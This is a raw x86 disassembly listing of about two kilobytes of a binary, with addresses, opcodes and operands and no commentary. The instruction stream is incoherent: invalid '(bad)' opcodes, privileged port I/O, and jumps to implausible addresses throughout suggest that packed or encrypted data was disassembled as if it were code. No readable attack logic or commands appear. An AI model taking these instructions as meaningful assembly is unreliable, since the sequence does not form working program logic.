  406766:	clc    
  406767:	jmp    0x358d1f6f
  40676c:	inc    esp
  40676d:	pop    ebp
  40676e:	cmp    ch,BYTE PTR [esi]
  406770:	jns    0x40679b
  406772:	icebp  
  406773:	aam    0xed
  406775:	(bad)  
  406776:	out    0x26,al
  406778:	dec    ecx
  406779:	leave  
  40677a:	or     ecx,ebp
  40677c:	add    esi,DWORD PTR [ecx]
  40677e:	xchg   edx,eax
  40677f:	mov    ah,0xfb
  406781:	stos   DWORD PTR es:[edi],eax
  406782:	sti    
  406783:	jae    0x4067ce
  406785:	mov    ecx,0x31839139
  40678a:	or     DWORD PTR [eax],eax
  40678c:	jmp    0xeeb8f442
  406791:	(bad)  
  406792:	out    0x50,al
  406794:	out    0x19,al
  406796:	adc    edi,edi
  406798:	cmp    esi,DWORD PTR [ecx]
  40679a:	mov    bh,BYTE PTR [ebp-0x2f]
  40679d:	xor    bl,BYTE PTR [ebx+eax*1+0x2a]
  4067a1:	pop    edx
  4067a2:	add    edi,edi
  4067a4:	cmp    al,0x85
  4067a6:	xchg   esp,eax
  4067a7:	test   DWORD PTR [ecx+0x5e],eax
  4067aa:	out    0xff,al
  4067ac:	sbb    DWORD PTR [eax],eax
  4067ae:	push   esi
  4067af:	pop    esp
  4067b0:	cld    
  4067b1:	rol    DWORD PTR ds:0x5ba6ffe6,0xa6
  4067b8:	je     0x4067a5
  4067ba:	imul   esp,DWORD PTR [edi+edi*8-0x5c0ebee4],0x7f
  4067c2:	xor    cl,BYTE PTR [ecx]
  4067c4:	mov    ebp,DWORD PTR [edx-0xe3d3015]
  4067ca:	xor    bh,BYTE PTR [ebx+ecx*4]
  4067cd:	test   DWORD PTR [ebx-0x66910734],esi
  4067d3:	adc    eax,0xe60b89e8
  4067d8:	push   DWORD PTR [eax+0x79]
  4067db:	loope  0x4067a4
  4067dd:	lods   al,BYTE PTR ds:[esi]
  4067de:	push   ss
  4067df:	or     DWORD PTR [eax],eax
  4067e1:	jmp    0xf5b64e18
  4067e6:	fisub  DWORD PTR [ecx-0x6e20c103]
  4067ec:	push   ebp
  4067ed:	in     eax,0x6b
  4067ef:	sti    
  4067f0:	imul   ebp,ecx,0x9cff0978
  4067f6:	(bad)  
  4067f7:	in     eax,0x75
  4067f9:	and    edi,ebx
  4067fb:	pop    ebx
  4067fc:	or     BYTE PTR [esi],dl
  4067fe:	dec    ecx
  4067ff:	adc    eax,0xd02ebbff
  406804:	ret    0xc000
  406807:	or     DWORD PTR [ebp-0x75],edx
  40680a:	cmp    al,0x8b
  40680c:	(bad)  
  40680d:	clc    
  40680e:	push   edi
  40680f:	push   ecx
  406810:	clc    
  406811:	add    BYTE PTR [eax],al
  406813:	mov    BYTE PTR [ecx],cl
  406815:	add    bh,al
  406817:	inc    ebp
  406818:	fld    DWORD PTR [eax]
  40681a:	add    BYTE PTR [eax-0x6faa74f7],bl
  406820:	pusha  
  406821:	adc    cl,BYTE PTR [ebp+0x6a50f555]
  406827:	mov    esp,esi
  406829:	jne    0x406827
  40682b:	scas   eax,DWORD PTR es:[edi]
  40682c:	pop    ebp
  40682d:	clc    
  40682e:	jmp    DWORD PTR ds:0x8452fee5
  406834:	pusha  
  406835:	inc    ebp
  406836:	clc    
  406837:	mov    eax,ds:0x50004ca
  40683c:	pusha  
  40683d:	in     al,dx
  40683e:	push   0x59
  406840:	inc    bp
  406842:	or     al,0xf8
  406844:	repz jne 0x40684f
  406847:	mov    al,ds:0xaffffc17
  40684c:	mov    al,ds:0x3c1808c2
  406851:	mov    ebp,esp
  406853:	xor    dl,BYTE PTR [ecx]
  406855:	lea    eax,[ebp+0x1c]
  406858:	cmp    edi,edi
  40685a:	jne    0x40685c
  40685c:	rcr    DWORD PTR [esi],0xfc
  40685f:	pop    edi
  406860:	test   cl,0xc2
  406863:	adc    BYTE PTR [ecx],cl
  406865:	push   ebp
  406866:	mov    ebx,DWORD PTR [edx+ecx*4+0x7d]
  40686a:	or     al,0xd8
  40686c:	pop    esp
  40686d:	adc    al,0x83
  40686f:	popf   
  406870:	clc    
  406871:	push   DWORD PTR [ebx-0x2]
  406874:	cmc    
  406875:	jne    0x406887
  406877:	add    BYTE PTR [edi],cl
  406879:	pop    esp
  40687a:	or     al,0xff
  40687c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40687d:	loopne 0x406866
  40687f:	std    
  406880:	xor    edi,esi
  406882:	in     al,dx
  406883:	(bad)  
  406884:	call   0x5c4068b9
  406889:	push   edi
  40688a:	loopne 0x40688b
  40688c:	and    al,0xc2
  40688e:	in     al,dx
  40688f:	jne    0x4068ca
  406891:	or     dh,BYTE PTR [eax-0x7f0c6101]
  406897:	jge    0x4068da
  406899:	bnd ja 0x4068b0
  40689c:	mov    dl,0x45
  40689e:	add    BYTE PTR [eax],al
  4068a0:	std    
  4068a1:	jmp    0x40688f
  4068a3:	jne    0x4068c6
  4068a5:	shl    DWORD PTR [esi+0xc],cl
  4068a8:	jbe    0x4068cf
  4068aa:	cld    
  4068ab:	out    0xa6,eax
  4068ad:	mov    ds:0xb078ffec,eax
  4068b2:	(bad)  
  4068b3:	inc    DWORD PTR ds:0xd483df67
  4068b9:	fld    QWORD PTR [ebx]
  4068bb:	je     0x4068f8
  4068bd:	xor    DWORD PTR [esi+0xc],0x59
  4068c1:	inc    eax
  4068c2:	fiadd  WORD PTR [eax]
  4068c4:	xor    DWORD PTR [edi+0x2712b01],eax
  4068ca:	in     eax,dx
  4068cb:	jne    0x40690a
  4068cd:	arpl   WORD PTR [esi+0x8],si
  4068d0:	sbb    DWORD PTR [edi],ebx
  4068d2:	in     al,dx
  4068d3:	call   FWORD PTR [esi]
  4068d5:	test   eax,0xa53108c1
  4068da:	js     0x4068c8
  4068dc:	add    BYTE PTR [esi],cl
  4068de:	mov    ebp,0x3b4ee7fb
  4068e3:	in     al,dx
  4068e4:	jmp    DWORD PTR [ecx-0x38]
  4068e7:	sti    
  4068e8:	addr16 inc ebx
  4068ea:	call   0xe7fb:0x9cee0042
  4068f1:	bound  ebx,QWORD PTR [ebx]
  4068f3:	in     al,dx
  4068f4:	dec    DWORD PTR [ebx-0xe]
  4068f7:	in     al,dx
  4068f8:	jne    0x406923
  4068fa:	or     DWORD PTR [ecx],edx
  4068fc:	push   edi
  4068fd:	into   
  4068fe:	jecxz  0x40691e
  406900:	pop    ecx
  406901:	xor    edx,DWORD PTR [esi-0x1b910054]
  406907:	xchg   esp,eax
  406908:	sti    
  406909:	into   
  40690a:	aas    
  40690b:	push   es
  40690c:	in     al,dx
  40690d:	scas   al,BYTE PTR es:[edi]
  40690e:	outs   dx,BYTE PTR ds:[esi]
  40690f:	jmp    0x40698f
  406911:	in     al,dx
  406912:	clc    
  406913:	cwde   
  406914:	in     al,dx
  406915:	and    al,0x11
  406917:	add    DWORD PTR [esi],edi
  406919:	xchg   esi,eax
  40691a:	jecxz  0x406902
  40691c:	dec    esp
  40691d:	js     0x4068e5
  40691f:	in     eax,dx
  406920:	add    ebx,esp
  406922:	pop    ebp
  406924:	xchg   DWORD PTR [ebp-0x1c],esi
  406927:	into   
  406928:	jno    0x406953
  40692a:	icebp  
  40692b:	sbb    esi,ebp
  40692d:	outs   dx,BYTE PTR ds:[esi]
  40692e:	jecxz  0x406942
  406930:	inc    ecx
  406931:	xor    eax,0xb2e82c92
  406936:	dec    ebp
  406937:	(bad)  
  406939:	enter  0xa608,0x71
  40693d:	cmp    eax,0xfc14e4
  406942:	dec    esi
  406943:	or     BYTE PTR [ebx+0x14e33eeb],dl
  406949:	call   0xdc31c684
  40694e:	xor    ah,dl
  406950:	jle    0x40693d
  406952:	es pop ebp
  406954:	loope  0x406931
  406956:	gs in  eax,0x6e
  406959:	jmp    0x406905
  40695b:	dec    esp
  40695c:	gs mov ebp,0x50e911f3
  406962:	mov    edx,0x5c06af5
  406967:	retf   
  406968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406969:	out    dx,eax
  40696a:	xor    DWORD PTR [ecx],ecx
  40696c:	jmp    0x3d8d2574
  406971:	push   esp
  406972:	out    0x5c,al
  406974:	add    cl,ah
  406976:	cli    
  406977:	sub    ebp,esi
  406979:	jmp    0xa200f5b0
  40697e:	sub    edx,esp
  406980:	jne    0x406973
  406982:	jmp    0x4590:0xca16f9df
  406989:	adc    edx,ecx
  40698b:	pop    esp
  40698c:	cld    
  40698d:	adc    DWORD PTR [edx-0x5816ff0b],ecx
  406993:	mov    ds:0x5c8bdf74,al
  406998:	clc    
  406999:	cdq    
  40699a:	hlt    
  40699b:	or     al,ch
  40699d:	pop    eax
  40699e:	xor    BYTE PTR [ecx],cl
  4069a0:	add    BYTE PTR [eax-0xf],dh
  4069a3:	fdiv   st(7),st
  4069a5:	pop    esp
  4069a6:	add    BYTE PTR [ecx+0x32bddbf1],cl
  4069ac:	or     edi,edi
  4069ae:	cmp    al,0x6d
  4069b0:	jmp    0x2c8b:0xe25bc2db
  4069b7:	popa   
  4069b8:	adc    cl,al
  4069ba:	mov    dh,0x82
  4069bc:	cmp    edi,edi
  4069be:	sbb    al,0x4d
  4069c0:	jmp    0xabc9:0xe25b9f92
  4069c7:	ds loop 0x406a1e
  4069ca:	bound  ebx,QWORD PTR [esi-0x7a]
  4069cd:	les    edi,FWORD PTR [ecx-0xd]
  4069d0:	dec    ebx
  4069d1:	hlt    
  4069d2:	jmp    0x64407309
  4069d7:	jno    0x4069be
  4069d9:	push   eax
  4069da:	outs   dx,BYTE PTR ds:[esi]
  4069db:	mov    eax,ds:0xe929e811
  4069e0:	or     BYTE PTR [eax],al
  4069e2:	fs repnz pusha 
  4069e5:	dec    ebp
  4069e6:	push   esi
  4069e7:	adc    DWORD PTR [ecx],0xe20575e8
  4069ed:	inc    DWORD PTR [eax]
  4069ef:	popa   
  4069f0:	dec    ecx
  4069f1:	clc    
  4069f2:	and    DWORD PTR [ebp+0x347204ed],0xffffff8a
  4069f9:	ins    DWORD PTR es:[edi],dx
  4069fa:	clc    
  4069fb:	int3   
  4069fc:	out    dx,al
  4069fd:	jne    0x4069fb
  4069ff:	and    BYTE PTR [edi-0x14],ch
  406a02:	add    al,bl
  406a04:	loop   0x4069c5
  406a06:	je     0x4069e2
  406a08:	out    dx,al
  406a09:	jne    0x406a03
  406a0b:	add    BYTE PTR [eax+0x43],bh
  406a0e:	add    al,ch
  406a10:	cdq    
  406a11:	or     BYTE PTR [eax],al
  406a13:	add    BYTE PTR [edi+0x11d0f79d],dl
  406a19:	dec    ecx
  406a1a:	hlt    
  406a1b:	call   FWORD PTR ds:0x6467e8ea
  406a21:	or     al,0x0
  406a23:	jmp    0x406aa3
  406a25:	lock jne 0x406a30
  406a28:	jo     0x406a6b
  406a2a:	sti    
  406a2b:	jmp    DWORD PTR [edi+0x3]
  406a2e:	ror    cl,0x9a
  406a31:	or     BYTE PTR [eax],al
  406a33:	jmp    0x406a83
  406a35:	add    al,0xc0
  406a37:	leave  
  406a38:	mov    cl,BYTE PTR [eax]
  406a3a:	add    BYTE PTR [edx+0x4a],ch
  406a3d:	inc    ebx
  406a3e:	cld    
  406a3f:	jmp    FWORD PTR ds:0x9104e7e5
  406a45:	out    dx,eax
  406a46:	inc    edi
  406a48:	or     eax,0x480001dd
  406a4d:	add    eax,0x35a8458d
  406a52:	push   DWORD PTR [ebp+0x20]
  406a55:	(bad)  
  406a58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a59:	repnz cmp DWORD PTR [ebp-0x68],0x5
  406a5e:	je     0x406a72
  406a60:	pop    es
  406a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a62:	cmp    eax,DWORD PTR [ebp+0x5c]
  406a65:	jo     0x406a6e
  406a67:	mov    eax,0x3f131
  406a6c:	xor    DWORD PTR [ebx+0x2],ecx
  406a6f:	sub    eax,DWORD PTR [eax]
  406a71:	icebp  
  406a72:	cmp    eax,DWORD PTR [esi]
  406a74:	sub    esi,ecx
  406a76:	sbb    esi,eax
  406a78:	add    al,0x31
  406a7a:	jge    0x406af8
  406a7c:	in     al,dx
  406a7d:	mov    dl,0x26
  406a7f:	in     al,dx
  406a80:	lea    esi,[esi+eiz*1+0x54]
  406a84:	(bad)  
  406a85:	cmp    al,0xda
  406a87:	fistp  DWORD PTR [edx]
  406a89:	int3   
  406a8a:	repnz add eax,DWORD PTR [ebp-0xe3850f]
  406a91:	and    al,0xda
  406a93:	fucomi st,st(6)
  406a95:	test   eax,0xf489e8df
  406a9a:	fld1   
  406a9c:	jne    0x406a33
  406a9e:	or     ah,ch
  406aa0:	jmp    0x406ad3
  406aa2:	repnz cld 
  406aa4:	mov    edi,0x75e8d5fd
  406aa9:	sub    eax,0xe1f86eb7
  406aae:	leave  
  406aaf:	or     esi,DWORD PTR cs:[ecx]
  406ab2:	bnd call 0xd2fad02d
  406ab8:	jmp    0x406aeb
  406aba:	bnd call 0xd30a9435
  406ac0:	cli    
  406ac1:	dec    esi
  406ac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ac3:	mov    edx,0x4ef239c2
  406ac8:	mov    ecx,DWORD PTR [ebp+0x73]
  406acb:	mov    edi,0xcccae2e8
  406ad0:	lea    esi,[esi+eax*4+0x53]
  406ad4:	inc    DWORD PTR [eax]
  406ad6:	pushf  
  406ad7:	fcmovu st,st(3)
  406ad9:	retf   0xf20d
  406adc:	add    eax,DWORD PTR [ebp-0x4884410f]
  406ae2:	xor    DWORD PTR [ecx],ecx
  406ae4:	jmp    0xf19670ec
  406ae9:	fistp  DWORD PTR [ebx-0x5717a920]
  406aef:	inc    ebp
  406af0:	push   ebp
  406af1:	call   0x7892485a
  406af6:	fimul  DWORD PTR [eax]
  406af8:	jmp    0x6d5009f9
  406afd:	xchg   DWORD PTR [ecx],esi
  406aff:	or     ecx,ebp
  406b01:	jp     0x406b77
  406b03:	fldenv [esi]
  406b05:	outs   dx,BYTE PTR ds:[esi]
  406b06:	mov    ebp,0x30047bf0
  406b0b:	or     DWORD PTR [edx-0x41],ebp
  406b0e:	sub    eax,0x103e906
  406b13:	or     DWORD PTR [ecx-0x16f72725],ebx
  406b19:	add    ebp,DWORD PTR [eax+0x1ce80545]
  406b1f:	aad    0x1
  406b21:	push   0x82e90a32
  406b26:	ins    DWORD PTR es:[edi],dx
  406b27:	add    al,0xe4
  406b29:	add    esi,DWORD PTR [ecx]
  406b2b:	stc    
  406b2c:	call   0xe9b8f484
  406b31:	add    esi,DWORD PTR [ecx]
  406b33:	xchg   edx,eax
  406b34:	sub    al,0xdc
  406b36:	fisttp DWORD PTR [eax]
  406b38:	mov    esi,0xdf4d0071
  406b3d:	cmp    al,0xf0
  406b3f:	push   esi
  406b40:	push   ebp
  406b41:	shl    edi,0xc4
  406b44:	fcom   DWORD PTR [ecx-0x16f5cda3]
  406b4a:	xor    BYTE PTR [ebp-0xc],0x5f
  406b4e:	inc    ecx
  406b4f:	cmp    edi,ebx
  406b51:	adc    al,0xe8
  406b53:	sbb    DWORD PTR [edi],edx
  406b55:	xchg   edx,eax
  406b56:	add    al,0x31
  406b58:	fdivrp st(4),st
  406b5a:	sti    
  406b5b:	push   ss
  406b5c:	cwde   
  406b5d:	add    BYTE PTR [ebx+0xe],dh
  406b60:	fild   QWORD PTR [edx-0x1f]
  406b63:	push   0xfffffff5
  406b65:	inc    edi
  406b66:	test   al,0x32
  406b68:	fidiv  WORD PTR [ebp-0xf]
  406b6b:	fiadd  DWORD PTR ds:0x130e56fd
  406b71:	fmul   DWORD PTR [esi+0x60]
  406b74:	aad    0xff
  406b76:	mov    esp,0x3de2e6ea
  406b7b:	(bad)  
  406b7c:	fisub  WORD PTR [ebx]
  406b7e:	adc    esi,ecx
  406b80:	push   esp
  406b81:	clc    
  406b82:	cs inc eax
  406b84:	icebp  
  406b85:	call   FWORD PTR [edx+ecx*8-0x29e3f71a]
  406b8c:	fisub  WORD PTR [ebx]
  406b8e:	xor    esi,ecx
  406b90:	push   esp
  406b91:	in     al,dx
  406b92:	add    DWORD PTR [esi],edi
  406b94:	or     DWORD PTR [eax],eax
  406b96:	jmp    0x1228c02a
  406b9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b9c:	fdivp  st(7),st
  406b9e:	jmp    0x894faa3
  406ba3:	add    DWORD PTR [eax+eiz*8-0x35f41901],eax
  406baa:	pop    ebx
  406bab:	mov    al,0x70
  406bad:	add    eax,0xecfa3c00
  406bb2:	or     DWORD PTR [ebp+ebp*2-0x22],0x73
  406bb7:	icebp  
  406bb8:	dec    edi
  406bb9:	push   esp
  406bba:	or     cl,dl
  406bbc:	outs   dx,DWORD PTR ds:[esi]
  406bbd:	repz add cl,ch
  406bc0:	cmp    ecx,ecx
  406bc2:	leave  
  406bc3:	stos   DWORD PTR es:[edi],eax
  406bc4:	dec    esi
  406bc5:	ficom  WORD PTR [edx+esi*2+0x5e]
  406bc9:	xchg   edx,eax
  406bca:	inc    ebp
  406bcb:	icebp  
  406bcc:	xor    DWORD PTR [ecx+0x3932e900],ecx
  406bd2:	push   0x29
  406bd4:	or     eax,0x1800eac5
  406bd9:	or     cl,cl
  406bdb:	ret    0xa14
  406bde:	push   ebp
  406bdf:	mov    ebp,DWORD PTR [esi+ecx*2-0x1de27404]
  406be6:	mov    cl,BYTE PTR [ebp-0x4]
  406be9:	jmp    0x2b02:0xbd49510e
  406bf0:	dec    eax
  406bf1:	fld    TBYTE PTR [ebx+0x3e55b59]
  406bf7:	repz ret 0xc946
  406bfb:	ret    0x9e0
  406bfe:	push   ebp
  406bff:	mov    ebp,DWORD PTR [esp+ecx*2+0x57]
  406c03:	mov    eax,DWORD PTR [eax]
  406c05:	popf   
  406c06:	aad    0xfb
  406c08:	mov    esp,DWORD PTR [ebp-0x47b2751f]
  406c0e:	jmp    0xc95e:0x4764f302
  406c15:	pop    edx
  406c16:	(bad)  
  406c17:	call   DWORD PTR [ebx+eiz*1-0x4a]
  406c1b:	push   esi
  406c1c:	push   edi
  406c1d:	and    ebx,DWORD PTR [ecx+0x8]
  406c20:	cld    
  406c21:	adc    esp,DWORD PTR [ecx]
  406c23:	adc    BYTE PTR [ebx],ch
  406c25:	pop    eax
  406c26:	arpl   WORD PTR [ebp+0xc],di
  406c29:	jnp    0x406c35
  406c2b:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c2d:	and    DWORD PTR [edx+0x44480175],0x5e
  406c34:	leave  
  406c35:	call   0x83c0:0xe354ffe0
  406c3c:	les    ebx,FWORD PTR [esi+ecx*2+0xaf05357]
  406c43:	add    DWORD PTR [eax],eax
  406c45:	pop    eax
  406c46:	in     al,0x75
  406c48:	or     BYTE PTR [eax-0x60000087],ah
  406c4e:	pop    edi
  406c4f:	jge    0x406c59
  406c51:	xor    DWORD PTR [edi],ebp
  406c53:	cmp    eax,0x43a032b
  406c58:	add    DWORD PTR [ecx],esi
  406c5a:	bnd jnp 0x406c71
  406c5d:	pop    ebx
  406c5e:	pop    esp
  406c5f:	ret    0x18e2
  406c62:	push   0x23760867
  406c67:	jns    0x406cde
  406c69:	add    BYTE PTR ds:0x31fe3f2c,dh
  406c6f:	idiv   DWORD PTR [edx+0x68da2b]
  406c75:	cmp    edi,DWORD PTR [ecx+0x6c00e4a5]
  406c7b:	inc    esp
  406c7c:	jp     0x406c82
  406c7e:	and    dl,dh
  406c80:	ds (bad) 
  406c82:	es pop esp
  406c84:	dec    edi
  406c85:	(bad)  
  406c86:	mov    ebx,0x2d8829e6
  406c8b:	out    0x79,eax
  406c8d:	inc    ebp
  406c8e:	mov    esi,0x703a005a
  406c93:	mov    bh,0x36
  406c95:	adc    BYTE PTR [ebx],ah
  406c97:	lock sbb cl,cl
  406c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c9b:	das    
  406c9c:	outs   dx,DWORD PTR ds:[esi]
  406c9d:	aad    0xfa
  406c9f:	jp     0x406ce6
  406ca1:	leave  
  406ca2:	jae    0x406c8a
  406ca4:	add    edx,DWORD PTR [ebp-0x46]
  406ca7:	fiadd  WORD PTR [eax+0x4e1f89c4]
  406cad:	push   edi
  406cae:	jle    0x406ce5
  406cb0:	cld    
  406cb1:	pop    edx
  406cb2:	stos   DWORD PTR es:[edi],eax
  406cb3:	out    dx,eax
  406cb4:	jnp    0x406cfb
  406cb6:	ins    BYTE PTR es:[edi],dx
  406cb7:	push   0x2db90140
  406cbc:	call   0x3d63c74c
  406cc1:	mov    ebx,esp
  406cc3:	in     eax,0xbc
  406cc5:	inc    ebp
  406cc6:	dec    ecx
  406cc7:	repnz add eax,DWORD PTR [eax]
  406cca:	xor    DWORD PTR [ecx],ecx
  406ccc:	jb     0x406d04
  406cce:	add    BYTE PTR [ecx],ah
  406cd0:	call   0xde2d52fe
  406cd5:	out    0xad,al
  406cd7:	je     0x406cb7
  406cd9:	fisubr WORD PTR [ebp+0x4e71213d]
  406cdf:	push   ds
  406ce0:	or     DWORD PTR [eax+ebp*8],edx
  406ce3:	es xchg ebx,eax
  406ce5:	sub    al,0xe8
  406ce7:	mov    ebx,0x5c7bb0f4
  406cec:	fcomi  st,st(6)
  406cee:	lods   eax,DWORD PTR ds:[esi]
  406cef:	je     0x406ccf
  406cf1:	jno    0x406d02
  406cf3:	cmp    DWORD PTR [edi+ebx*4],ecx
  406cf6:	ds in  eax,dx
  406cf8:	mov    ?,WORD PTR [esp+eiz*8+0x7a00f4b9]
  406cff:	test   ah,bl
  406d01:	jmp    0x406d51
  406d03:	xlat   BYTE PTR ds:[ebx]
  406d04:	mov    ds,ebp
  406d06:	sub    DWORD PTR [edx+0x1d333145],edi
  406d0c:	sbb    DWORD PTR [esi],esp
  406d0e:	ds mov ecx,0x6c7929e6
  406d14:	fisub  WORD PTR [ecx+0x0]
  406d17:	mov    ebx,0xf27b0d45
  406d1c:	or     DWORD PTR [esi+0x2bd1fa45],esp
  406d22:	not    DWORD PTR [esi-0x4f289dcc]
  406d28:	(bad)  
  406d29:	std    
  406d2a:	in     al,0x86
  406d2c:	fstp   TBYTE PTR [edx]
  406d2e:	das    
  406d2f:	pop    edx
  406d30:	lea    esp,[eax+eiz*8]
  406d33:	add    cl,ah
  406d35:	fistp  DWORD PTR [esp+ecx*1+0x59]
  406d39:	push   ebp
  406d3a:	ret    
  406d3b:	add    al,0x31
  406d3d:	xchg   BYTE PTR [ecx-0x168d56ed],ch
  406d43:	add    esi,DWORD PTR [ecx]
  406d45:	fadd   QWORD PTR [eax]
  406d47:	cmp    al,0x3d
  406d49:	icebp  
  406d4a:	inc    ebp
  406d4b:	mov    bh,0x52
  406d4d:	fisttp DWORD PTR [ecx+0x75db592c]
  406d53:	popf   
  406d54:	inc    ebp
  406d55:	push   ds
  406d56:	jmp    0xc04ea044
  406d5b:	adc    eax,0x79459092
  406d60:	adc    dl,BYTE PTR [ebp-0xc]
  406d63:	xchg   ecx,eax
  406d64:	mov    ebx,ebx
  406d66:	push   DWORD PTR [esi-0x44]
  406d69:	inc    esp
  406d6a:	clc    
  406d6b:	outs   dx,BYTE PTR ds:[esi]
  406d6c:	push   0xdadcffd5
  406d71:	fidiv  DWORD PTR [ebp+0x59]
  406d74:	add    eax,0xd256fe8e
  406d79:	fidiv  DWORD PTR [ebp+0x4d]
  406d7c:	aad    0x1
  406d7e:	jmp    0x761aa06c
  406d83:	in     eax,dx
  406d84:	retf   0xe905
  406d87:	jmp    0xb53fa6be
  406d8c:	mov    WORD PTR ss:[ebp-0x252ce9],es
  406d93:	mov    ecx,0x16fea4ca
  406d98:	add    BYTE PTR [edx-0x6dea8a26],dl
  406d9e:	push   esp
  406d9f:	clc    
  406da0:	je     0x406d4a
  406da2:	jmp    0x406da2
  406da4:	(bad)  
  406da5:	xchg   ebx,eax
  406da6:	cmp    eax,ebp
  406da8:	not    DWORD PTR [eax-0x16110026]
  406dae:	adc    al,ch
  406db0:	push   esp
  406db1:	pop    ebp
  406db2:	(bad)  
  406db4:	push   ebx
  406db5:	and    eax,0xf4211f71
  406dba:	or     bh,bh
  406dbc:	push   esp
  406dbd:	xor    eax,0x7200bbf1
  406dc2:	out    0xff,eax
  406dc4:	or     edx,DWORD PTR [eax-0x780b8a19]
  406dca:	inc    ecx
  406dcb:	clc    
  406dcc:	(bad)  
  406dcd:	std    
  406dce:	or     al,0xe8
  406dd0:	stos   DWORD PTR es:[edi],eax
  406dd1:	xchg   edx,eax
  406dd2:	out    0xff,eax
  406dd4:	and    esi,DWORD PTR [eax-0x19]
  406dd7:	jne    0x406dd1
  406dd9:	mov    al,0x9a
  406ddb:	std    
  406ddc:	push   DWORD PTR [edi-0x3ff78a1a]
  406de2:	test   al,0xf7
  406de4:	call   DWORD PTR [edi-0x2ea43c75]
  406dea:	ret    
  406deb:	or     BYTE PTR [eax],al
  406ded:	sbb    eax,0x4c83ec8a
  406df2:	mov    dl,0x57
  406df4:	mov    ecx,ebp
  406df6:	ror    DWORD PTR [edx],1
  406df8:	ror    BYTE PTR [eax+edx*1],0xc7
  406dfc:	add    BYTE PTR [eax],al
  406dfe:	fadd   DWORD PTR ds:0xe6430000
  406e04:	cmp    DWORD PTR [ebp-0x30],0x4
  406e08:	jne    0x406e11
  406e0a:	inc    edx
  406e0b:	push   es
  406e0c:	add    al,BYTE PTR [eax]
  406e0e:	fsubr  st,st(2)
  406e10:	jae    0x75424bab
  406e16:	iret   
  406e17:	jnp    0x406e19
  406e19:	add    DWORD PTR [eax+0x7302eb05],ebx
  406e1f:	xchg   ebx,eax
  406e20:	or     edx,0x20591
  406e26:	add    eax,0xaa50fc51
  406e2b:	imul   eax,DWORD PTR [eax],0xffffffff
  406e2e:	std    
  406e2f:	or     edi,edi
  406e31:	jne    0x406db3
  406e33:	in     eax,dx
  406e34:	mov    ds:0xb0588e9,al
  406e39:	shl    BYTE PTR [ecx],0x3d
  406e3c:	jno    0x406dcb
  406e3e:	in     al,dx
  406e3f:	mov    bh,0x34
  406e41:	push   0x31
  406e43:	push   ebp
  406e44:	inc    edi
  406e45:	hlt    
  406e46:	add    DWORD PTR [esi],esi
  406e48:	add    al,0xff
  406e4a:	les    edi,FWORD PTR [edi-0x38ba8a20]
  406e50:	(bad)
  406e54:	or     al,0xc0
  406e56:	mov    esp,0x297d852b
  406e5b:	jecxz  0x406eb4
  406e5d:	inc    esi
  406e5e:	mov    dl,0x5
  406e60:	fadd   DWORD PTR [ecx]
  406e62:	add    BYTE PTR [eax+ebp*8-0x1de6827c],ah
  406e69:	push   edi
  406e6a:	cmp    bh,BYTE PTR [edx+0x6140dc25]
  406e70:	mov    al,BYTE PTR [edx-0x3]
  406e73:	(bad)  
  406e74:	outs   dx,DWORD PTR ds:[esi]
  406e75:	(bad)  
  406e76:	clc    
  406e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e78:	lods   eax,DWORD PTR ds:[esi]
  406e79:	fist   DWORD PTR [eax-0x7a]
  406e7c:	int3   
  406e7d:	add    ebp,DWORD PTR [edx+0x31]
  406e80:	inc    edi
  406e81:	push   edi
  406e82:	adc    dh,bl
  406e84:	xchg   ebp,eax
  406e85:	fucomip st,st(0)
  406e87:	jle    0x406ec2
  406e89:	add    al,0x0
  406e8b:	cmp    ah,BYTE PTR [edx]
  406e8d:	pop    eax
  406e8e:	or     bl,BYTE PTR [esi+0x4a]
  406e91:	sub    ebp,edi
  406e93:	mov    esi,0xcaff2d2f
  406e98:	out    0x8c,al
  406e9a:	inc    ebp
  406e9b:	inc    ebp
  406e9c:	jmp    0x406e61
  406e9e:	je     0x406ecc
  406ea0:	pop    es
  406ea1:	push   edi
  406ea2:	clc    
  406ea3:	scas   al,BYTE PTR es:[edi]
  406ea4:	loop   0x406e86
  406ea6:	jne    0x406e3d
  406ea8:	cli    
  406ea9:	sbb    al,0xe9
  406eab:	xor    edx,esp
  406ead:	mov    edi,es
  406eaf:	cmp    ah,BYTE PTR [edx]
  406eb1:	push   edi
  406eb2:	sbb    al,0xb2
  406eb4:	or     DWORD PTR [esp+edi*8+0x30],esp
  406eb8:	pop    esp
  406eb9:	test   DWORD PTR [esp+esi*8+0x663428f0],0xe4e0f55e
  406ec4:	clc    
  406ec5:	lds    edx,FWORD PTR [esi+0x0]
  406ec8:	and    eax,0x590c34d8
  406ecd:	sub    dh,BYTE PTR [esi-0x5fc7b920]
  406ed3:	lds    esp,FWORD PTR ds:0x458d3c09
  406ed9:	mov    bl,BYTE PTR [esp+ecx*1]
  406edc:	xor    BYTE PTR [ecx],cl
  406ede:	jmp    0x8e430b66
  406ee3:	push   ss
  406ee4:	out    0x40,eax
  406ee6:	sub    BYTE PTR [esi+eiz*4],al
  406ee9:	dec    ebp
  406eea:	icebp  
  406eeb:	ins    DWORD PTR es:[edi],dx
  406eec:	xor    eax,ebx
  406eee:	cld    
  406eef:	test   DWORD PTR [edi],0x84e0d95e
  406ef5:	add    eax,0xe1295666
  406efa:	push   ebp
  406efb:	loope  0x406eeb
  406efd:	xlat   BYTE PTR ds:[ebx]
  406efe:	and    ch,al
  406f00:	inc    ecx
  406f01:	or     DWORD PTR [edx],eax
  406f03:	les    ebp,FWORD PTR [edx-0x671ae748]
  406f09:	add    ecx,ebp
  406f0b:	add    esi,DWORD PTR [ecx]
  406f0d:	mov    edx,0x8a355443
  406f12:	cmp    edx,DWORD PTR [edx]
  406f14:	mov    ds:0xc38225a1,eax
  406f19:	stc    
  406f1a:	div    edx
  406f1c:	inc    ecx
  406f1d:	jmp    0x406f26
  406f1f:	mov    bh,BYTE PTR ds:0xf08ac98e
  406f25:	or     BYTE PTR [edi],al
  406f27:	ret    
  406f28:	sbb    al,0xb3
  406f2a:	sub    dh,BYTE PTR [esi]
